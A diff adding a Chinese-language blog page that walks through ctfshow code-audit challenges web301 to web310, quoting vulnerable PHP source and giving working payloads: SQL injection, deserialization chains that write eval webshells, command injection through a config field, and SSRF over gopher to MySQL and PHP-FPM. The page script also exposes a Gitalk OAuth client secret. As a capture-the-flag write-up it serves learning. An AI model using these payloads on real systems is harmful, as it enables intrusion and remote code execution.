@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]代码审计 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1717739446385">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web301
+checklogin.php中有很明显的sql注入点。
+&lt;?php
+error_reporting(0);
+session_start();
+require 'conn.php';
+$_POST['userid']=!e..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1717739446385" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]代码审计</h2>
+            <div class="post-date">2024-04-08</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web301">web301</h2>
+<p>checklogin.php中有很明显的sql注入点。</p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+session_start();
+require 'conn.php';
+$_POST['userid']=!empty($_POST['userid'])?$_POST['userid']:&quot;&quot;;
+$_POST['userpwd']=!empty($_POST['userpwd'])?$_POST['userpwd']:&quot;&quot;;
+$username=$_POST['userid'];
+$userpwd=$_POST['userpwd'];
+$sql=&quot;select sds_password from sds_user where sds_username='&quot;.$username.&quot;' order by id limit 1;&quot;;
+$result=$mysqli-&gt;query($sql);
+$row=$result-&gt;fetch_array(MYSQLI_BOTH);
+if($result-&gt;num_rows&lt;1){
+	$_SESSION['error']=&quot;1&quot;;
+	header(&quot;location:login.php&quot;);
+	return;
+}
+if(!strcasecmp($userpwd,$row['sds_password'])){
+	$_SESSION['login']=1;
+	$result-&gt;free();
+	$mysqli-&gt;close();
+	header(&quot;location:index.php&quot;);
+	return;
+}
+$_SESSION['error']=&quot;1&quot;;
+header(&quot;location:login.php&quot;);
+
+?&gt;
+</code></pre>
+<p>payload</p>
+<pre><code>userid=1' union select 123456#&amp;userpwd=123456
+</code></pre>
+<h2 id="web302">web302</h2>
+<p>密码比较处逻辑修改了,对用户密码进行了md5计算，再与数据库存储的哈希值比较。</p>
+<pre><code class="language-php">if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){
+</code></pre>
+<p>使用fun.php生成密码哈希值。</p>
+<pre><code class="language-php">&lt;?php
+function sds_decode($str){
+	return md5(md5($str.md5(base64_encode(&quot;sds&quot;))).&quot;sds&quot;);
+}
+
+
+echo(sds_decode(&quot;123456&quot;));
+</code></pre>
+<p>修改一下payload</p>
+<pre><code>userid=1' union select &quot;c98d7f443e1533f4b0707953f2af85d4&quot;#&amp;userpwd=123456
+</code></pre>
+<h2 id="web303">web303</h2>
+<p>限制了username长度</p>
+<pre><code class="language-php">if(strlen($username)&gt;6){
+	die();
+}
+</code></pre>
+<p>虽然sql注入漏洞点依然存在，但无法利用。<br>
+使用admin/admin账号登录后台。<br>
+在dptadd.php中存在新的注入点</p>
+<pre><code class="language-php">&lt;?php
+session_start();
+require 'conn.php';
+if(!isset($_SESSION['login'])){
+header(&quot;location:login.php&quot;);
+return;
+}else{
+	//注入点
+	$_POST['dpt_name']=!empty($_POST['dpt_name'])?$_POST['dpt_name']:NULL;
+	$_POST['dpt_address']=!empty($_POST['dpt_address'])?$_POST['dpt_address']:NULL;
+	$_POST['dpt_build_year']=!empty($_POST['dpt_build_year'])?$_POST['dpt_build_year']:NULL;
+	$_POST['dpt_has_cert']=!empty($_POST['dpt_has_cert'])?$_POST['dpt_has_cert']:NULL;
+	$_POST['dpt_cert_number']=!empty($_POST['dpt_cert_number'])?$_POST['dpt_cert_number']:NULL;
+	$_POST['dpt_telephone_number']=!empty($_POST['dpt_telephone_number'])?$_POST['dpt_telephone_number']:NULL;
+	
+	$dpt_name=$_POST['dpt_name'];
+	$dpt_address=$_POST['dpt_address'];
+	$dpt_build_year=$_POST['dpt_build_year'];
+	$dpt_has_cert=$_POST['dpt_has_cert']==&quot;on&quot;?&quot;1&quot;:&quot;0&quot;;
+	$dpt_cert_number=$_POST['dpt_cert_number'];
+	$dpt_telephone_number=$_POST['dpt_telephone_number'];
+	$mysqli-&gt;query(&quot;set names utf-8&quot;);
+	$sql=&quot;insert into sds_dpt set sds_name='&quot;.$dpt_name.&quot;',sds_address ='&quot;.$dpt_address.&quot;',sds_build_date='&quot;.$dpt_build_year.&quot;',sds_have_safe_card='&quot;.$dpt_has_cert.&quot;',sds_safe_card_num='&quot;.$dpt_cert_number.&quot;',sds_telephone='&quot;.$dpt_telephone_number.&quot;';&quot;;
+	$result=$mysqli-&gt;query($sql);
+	echo $sql;
+	if($result===true){
+		$mysqli-&gt;close();
+		header(&quot;location:dpt.php&quot;);
+	}else{
+		die(mysqli_error($mysqli));
+	}
+	
+	 }
+
+
+?&gt;
+</code></pre>
+<p>在添加机构功能处<br>
+<img src="https://fallingskies22.github.io/post-images/1713353999086.png" alt="" loading="lazy"></p>
+<p>分析代码后发现是insert类型注入<br>
+payload如下：</p>
+<p>查询表名</p>
+<pre><code>dpt_name=hhh&amp;dpt_address=hhh&amp;dpt_build_year=2024-04-03&amp;dpt_has_cert=on&amp;dpt_cert_number=123456',sds_telephone=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&amp;dpt_telephone_number=
+</code></pre>
+<p>查询列名</p>
+<pre><code>dpt_name=123&amp;dpt_address=123&amp;dpt_build_year=2024-03-25&amp;dpt_has_cert=on&amp;dpt_cert_number=123456',sds_telephone=(select group_concat(column_name) from information_schema.columns where table_name='sds_fl9g')#&amp;dpt_telephone_number=
+</code></pre>
+<p>查询flag</p>
+<pre><code>dpt_name=qwe&amp;dpt_address=qwe&amp;dpt_build_year=2024-03-25&amp;dpt_has_cert=on&amp;dpt_cert_number=123456',sds_telephone=(select flag from sds_fl9g)#&amp;dpt_telephone_number=
+</code></pre>
+<h2 id="web304">web304</h2>
+<p>增加了全局waf</p>
+<pre><code class="language-php">function sds_waf($str){
+	return preg_match('/[0-9]|[a-z]|-/i', $str);
+}
+</code></pre>
+<p>因该是waf编写的有问题，只要含有数字，字母或者<code>-</code>就能通过。<br>
+继续使用上题payload即可。</p>
+<h2 id="web305">web305</h2>
+<p>加强了waf，过滤了一堆字符</p>
+<pre><code class="language-php">function sds_waf($str){
+	if(preg_match('/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\&quot;|\,|\.|\?|\/|\\\|\&lt;|\&gt;/', $str)){
+		return false;
+	}else{
+		return true;
+	}
+}
+</code></pre>
+<p>引号被过滤了，没有办法进行注入。<br>
+分析代码存在反序列化入口</p>
+<pre><code class="language-php">$user_cookie = $_COOKIE['user'];
+if(isset($user_cookie)){
+	$user = unserialize($user_cookie);
+}
+</code></pre>
+<p>编写payload</p>
+<pre><code class="language-php">&lt;?php
+
+class user{
+	public $username;
+	public $password;
+	public function __construct($u,$p){
+		$this-&gt;username=$u;
+		$this-&gt;password=$p;
+	}
+	public function __destruct(){
+		file_put_contents($this-&gt;username, $this-&gt;password);
+	}
+}
+
+echo(serialize(new user(&quot;1.php&quot;,&quot;&lt;?php @eval(\$_GET[1]);?&gt;&quot;)));
+</code></pre>
+<p>cookie需要urlencoding</p>
+<pre><code>Cookie: user=%4f%3a%34%3a%22%75%73%65%72%22%3a%32%3a%7b%73%3a%38%3a%22%75%73%65%72%6e%61%6d%65%22%3b%73%3a%35%3a%22%31%2e%70%68%70%22%3b%73%3a%38%3a%22%70%61%73%73%77%6f%72%64%22%3b%73%3a%32%34%3a%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%47%45%54%5b%31%5d%29%3b%3f%3e%22%3b%7d
+</code></pre>
+<p>使用蚁剑连接shell后，使用root/root连接数据库，找到flag</p>
+<h2 id="web306">web306</h2>
+<p>漏洞点位于dao.php中<br>
+一般数据库操作层面的文件起名为dao</p>
+<pre><code class="language-php">&lt;?php
+
+require 'config.php';
+require 'class.php';
+
+
+class dao{
+   private $config;
+   private $conn;
+
+   public function __construct(){
+   	$this-&gt;config=new config();
+   	$this-&gt;init();
+   }
+   private function init(){
+   	$this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());
+   }
+   public function __destruct(){
+   	$this-&gt;conn-&gt;close();
+   }
+
+   public function get_user_password_by_username($u){
+   	$sql=&quot;select sds_password from sds_user where sds_username='&quot;.$u.&quot;' order by id limit 1;&quot;;
+   	$result=$this-&gt;conn-&gt;query($sql);
+   	$row=$result-&gt;fetch_array(MYSQLI_BOTH);
+   	if($result-&gt;num_rows&gt;0){
+   		return $row['sds_password'];
+   	}else{
+   		return '';
+   	}
+   }
+
+}
+</code></pre>
+<p>checklogin.php中调用sevice-&gt;login函数</p>
+<pre><code class="language-php">&lt;?php
+#error_reporting(0);
+session_start();
+require 'service.php';
+
+$username=$_POST['userid'];
+$userpwd=$_POST['userpwd'];
+$service=new service();
+
+$user=$service-&gt;login($username,$userpwd);
+if($user){
+   setcookie('user',base64_encode(serialize($user)),time()+60);
+   header(&quot;location:index.php&quot;);
+}else{
+   header(&quot;location:login.php&quot;);
+}
+
+?&gt;
+</code></pre>
+<p>sevice.php</p>
+<pre><code class="language-php">&lt;?php
+
+require 'dao.php';
+require 'fun.php';
+define(&quot;__USERNAME_MAX_LENGTH&quot;, 6);
+
+class service{
+   private $dao;
+   public function __construct(){
+   	$this-&gt;dao=new dao();
+   }
+   public function login($u,$p){
+   	if(isset($u) &amp;&amp; isset($p) &amp;&amp; strlen($u)&lt;__USERNAME_MAX_LENGTH){
+   		$password = $this-&gt;dao-&gt;get_user_password_by_username($u);
+   		if($password===sds_decode($p)){
+   			return new user($u,$p);
+   		}
+   	}
+   	return false;
+   }
+}
+</code></pre>
+<p>但是这里同样限制用户名长度小于6，所以利用不了</p>
+<p>再index.php发现反序列化入口点</p>
+<pre><code class="language-php">&lt;?php
+session_start();
+require &quot;conn.php&quot;;
+require &quot;dao.php&quot;;
+$user = unserialize(base64_decode($_COOKIE['user']));
+if(!$user){
+    header(&quot;location:login.php&quot;);
+}
+?&gt;
+</code></pre>
+<p>再class.php中找到可以利用file_pup_contents写webshell</p>
+<pre><code class="language-php">&lt;?php
+
+class user{
+	public $username;
+	public $password;
+	public function __construct($u,$p){
+		$this-&gt;username=$u;
+		$this-&gt;password=$p;
+	}
+}
+
+class dpt{
+	public $name;
+	public $address;
+	public $build_year;
+	public $have_cert=&quot;0&quot;;
+	public $cert_num;
+	public $phone;
+	public function __construct($n,$a,$b,$h,$c,$p){
+		$this-&gt;name=$n;
+		$this-&gt;address=$a;
+		$this-&gt;build_year=$b;
+		$this-&gt;have_cert=$h;
+		$this-&gt;cert_num=$c;
+		$this-&gt;phone=$p;
+
+	}
+}
+class log{
+	public $title='log.txt';
+	public $info='';
+	public function loginfo($info){
+		$this-&gt;info=$this-&gt;info.$info;
+	}
+	public function close(){
+		file_put_contents($this-&gt;title, $this-&gt;info);
+	}
+
+}
+</code></pre>
+<p>查看是否有调用close函数的地方<br>
+刚刚的dao.php中刚好有,而且通过__destruct函数调用，这样链条就通了。</p>
+<pre><code class="language-php">class dao{
+	private $config;
+	private $conn;
+    public function __destruct(){
+            $this-&gt;conn-&gt;close();
+	}
+}
+</code></pre>
+<p>payload</p>
+<pre><code class="language-php">&lt;?php
+
+class dao{
+private $config;
+private $conn;
+
+    public function __construct($config,$conn){
+        $this-&gt;config=$config;
+        $this-&gt;conn=$conn;
+    }
+    public function __destruct(){
+        $this-&gt;conn-&gt;close();
+    }
+}
+
+class log{
+    public $title='log.txt';
+    public $info='';
+    public function __construct($title,$info){
+        $this-&gt;title=$title;
+        $this-&gt;info=$info;
+    }
+    public function loginfo($info){
+        $this-&gt;info=$this-&gt;info.$info;
+    }
+    public function close(){
+        file_put_contents($this-&gt;title, $this-&gt;info);
+    }
+
+}
+
+$log = new log(&quot;1.php&quot;,&quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot;);
+$dao = new dao(&quot;&quot;,$log);
+
+
+
+echo base64_encode(serialize($dao));
+</code></pre>
+<p>使用蚁剑连接shell，flag再flag.php中。</p>
+<h2 id="web307">web307</h2>
+<p>查看dao.php</p>
+<pre><code class="language-php">&lt;?php
+require 'config/config.php';
+require 'class.php';
+
+
+class dao{
+	private $config;
+	private $conn;
+
+	public function __construct(){
+		$this-&gt;config=new config();
+		$this-&gt;init();
+	}
+	private function init(){
+		$this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());
+	}
+	public function __destruct(){
+		$this-&gt;conn-&gt;close();
+	}
+
+	public function get_user_password_by_username($u){
+		$sql=&quot;select sds_password from sds_user where sds_username='&quot;.$u.&quot;' order by id limit 1;&quot;;
+		$result=$this-&gt;conn-&gt;query($sql);
+		$row=$result-&gt;fetch_array(MYSQLI_BOTH);
+		if($result-&gt;num_rows&gt;0){
+			return $row['sds_password'];
+		}else{
+			return '';
+		}
+	}
+
+	public function get_dpt_all(){
+		$sql=&quot;select * from sds_dpt;&quot;;
+		$result=$this-&gt;conn-&gt;query($sql);
+		$dpt_array = array();
+		if($result-&gt;num_rows&gt;0){
+			while($row=$result-&gt;fetch_array(MYSQLI_BOTH)){
+				array_push($dpt_array, new dpt($row['id'],$row['sds_name'],$row['sds_address'],$row['sds_build_date'],$row['sds_have_safe_card'],$row['sds_safe_card_num'],$row['sds_telephone']));
+			}
+		}
+		return $dpt_array;
+	}
+	public function insert_dpt($u,$a,$b,$h,$c,$p){
+		$sql=&quot;insert INTO `sds_dpt` (`sds_name`, `sds_address`, `sds_build_date`, `sds_have_safe_card`, `sds_safe_card_num`, `sds_telephone`) VALUES ('$u', '$a', '$b', '$h', '$c', '$p');&quot;;
+		$result=$this-&gt;conn-&gt;query($sql);
+		return $result;
+
+	}
+	public function  clearCache(){
+		shell_exec('rm -rf ./'.$this-&gt;config-&gt;cache_dir.'/*');
+	}
+
+}
+</code></pre>
+<p>clearCache函数存在命令执行点，可以考虑命令注入。<br>
+logout.php中存在反序列化入口，并且调用了clearCache函数。</p>
+<pre><code class="language-php">&lt;?php
+session_start();
+error_reporting(0);
+require 'service/service.php';
+unset($_SESSION['login']);
+unset($_SESSION['error']);
+setcookie('user','',0,'/');
+$service = unserialize(base64_decode($_COOKIE['service']));
+if($service){
+	$service-&gt;clearCache();
+}
+setcookie('PHPSESSID','',0,'/');
+setcookie('service','',0,'/');
+header(&quot;location:../login.php&quot;);
+?&gt;
+</code></pre>
+<p>service类中含有wakeup函数会初始化变量，利用不了。<br>
+直接使用dao类</p>
+<p>payload</p>
+<pre><code class="language-php">&lt;?php
+class service
+{
+    private $dao;
+    private $config;
+
+    public function __construct($config,$dao)
+    {
+        $this-&gt;config = $config;
+        $this-&gt;dao = $dao;
+    }
+}
+
+
+class config{
+    private $mysql_username='root';
+    private $mysql_password='root';
+    private $mysql_db='sds';
+    private $mysql_port=3306;
+    private $mysql_host='localhost';
+    public $cache_dir = 'xxx;echo &quot;&lt;?php eval(\$_POST[1]);?&gt;&quot; &gt; 1.php; ';
+
+}
+
+class dao{
+    private $config;
+    private $conn;
+
+    public function __construct($config,$conn){
+        $this-&gt;config=$config;
+        $this-&gt;conn=$conn;
+    }
+}
+
+$config = new config();
+$dao = new dao($config,&quot;&quot;);
+
+echo base64_encode(serialize($dao));
+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1713782379135.png" alt="" loading="lazy"></figure>
+<h2 id="web308">web308</h2>
+<p>clearCache函数做了过滤，无法利用</p>
+<pre><code class="language-php">public function  clearCache(){
+		if(preg_match('/^[a-z]+$/i', $this-&gt;config-&gt;cache_dir)){
+			shell_exec('rm -rf ./'.$this-&gt;config-&gt;cache_dir.'/*');
+		}
+	}
+</code></pre>
+<p>dao.php中新加了一个checkVersion函数</p>
+<pre><code class="language-php">public function checkVersion(){
+		return checkUpdate($this-&gt;config-&gt;update_url);
+	}
+</code></pre>
+<p>跟进到fun.php中，这里如果url可控，就是典型的ssrf。</p>
+<pre><code class="language-php">function checkUpdate($url){
+		$ch=curl_init();
+		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_HEADER, false);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+		$res = curl_exec($ch);
+		curl_close($ch);
+		return $res;
+	}
+</code></pre>
+<p>index.php中调用了checkVersion函数</p>
+<pre><code class="language-php">&lt;?php
+session_start();
+error_reporting(0);
+require 'controller/service/service.php';
+if(!isset($_SESSION['login'])){
+header(&quot;location:login.php&quot;);
+}
+$service = unserialize(base64_decode($_COOKIE['service']));
+if($service){
+    $lastVersion=$service-&gt;checkVersion();
+}
+?&gt;
+</code></pre>
+<p>分析后发现需要登录后才可利用（不是😅）。<br>
+header后的PHP代码还会被执行。终止代码执行应该在后面加一个exit();或者die();</p>
+<p>刚好这里的mysql无密码，可以利用SSRF</p>
+<p>使用gopherus生成payload</p>
+<pre><code>root
+ select &quot;&lt;?php @eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;;
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://fallingskies22.github.io/post-images/1713783941557.png" alt="" loading="lazy"></figure>
+<p>反序列化exp</p>
+<pre><code class="language-php">&lt;?php
+
+class config
+{
+    public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%48%00%00%00%03%20%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01';
+}
+class dao{
+    private $config;
+    private $conn;
+
+    public function __construct($config,$conn){
+        $this-&gt;config=$config;
+        $this-&gt;conn=$conn;
+    }
+
+}
+
+$dao = new dao(new config(),&quot;&quot;);
+
+echo base64_encode(serialize($dao));
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://fallingskies22.github.io/post-images/1713783964041.png" alt="" loading="lazy"></figure>
+<h2 id="web309">web309</h2>
+<p>根据提示mysql设置了密码，无法进行利用了。</p>
+<p>先使用SSRF加file协议读取nginx配置文件</p>
+<pre><code>file:///etc/nginx/nginx.conf
+</code></pre>
+<p>发现本地开放9000端口，运行fastcgi协议。<br>
+利用PHP-FPM的任意代码执行，参考https://xz.aliyun.com/t/9544</p>
+<p>使用Gopherus生成payload<br>
+<img src="https://fallingskies22.github.io/post-images/1713837338530.png" alt="" loading="lazy"></p>
+<p>反序列化exp</p>
+<pre><code class="language-php">&lt;?php
+
+class config
+{
+    public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';
+}
+class dao{
+    private $config;
+    private $conn;
+
+    public function __construct($config,$conn){
+        $this-&gt;config=$config;
+        $this-&gt;conn=$conn;
+    }
+
+}
+
+$dao = new dao(new config(),&quot;&quot;);
+
+echo base64_encode(serialize($dao));
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://fallingskies22.github.io/post-images/1713837301467.png" alt="" loading="lazy"></figure>
+<h2 id="web310">web310</h2>
+<p>查看nginx配置文件</p>
+<pre><code>daemon off;
+
+worker_processes  auto;
+
+error_log  /var/log/nginx/error.log warn;
+
+events {
+    worker_connections  1024;
+}
+
+http {
+    include       /etc/nginx/mime.types;
+    default_type  application/octet-stream;
+    sendfile        on;
+    keepalive_timeout  65;
+
+    server {
+        listen       80;
+        server_name  localhost;
+        root         /var/www/html;
+        index index.php;
+
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
+        location / {
+            try_files $uri  $uri/ /index.php?$args;
+        }
+
+        location ~ \.php$ {
+            try_files $uri =404;
+            fastcgi_pass   127.0.0.1:9000;
+            fastcgi_index  index.php;
+            include        fastcgi_params;
+            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
+        }
+
+    }
+	server {
+        listen       4476;
+        server_name  localhost;
+        root         /var/flag;
+        index index.html;
+
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+}
+</code></pre>
+<p>发现开放4476端口<br>
+使用http协议访问即可获得flag</p>
+<pre><code class="language-php">&lt;?php
+
+class config
+{
+    public $update_url = 'http://127.0.0.1:4476';
+}
+class dao{
+    private $config;
+    private $conn;
+
+    public function __construct($config,$conn){
+        $this-&gt;config=$config;
+        $this-&gt;conn=$conn;
+    }
+
+}
+
+$dao = new dao(new config(),&quot;&quot;);
+
+echo base64_encode(serialize($dao));
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://fallingskies22.github.io/post-images/1713838625496.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/phpeval-dai-ma-zhi-xing-rao-guo-zong-jie/">
+                  <h3 class="post-title">
+                    [PHP]eval代码执行绕过总结
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
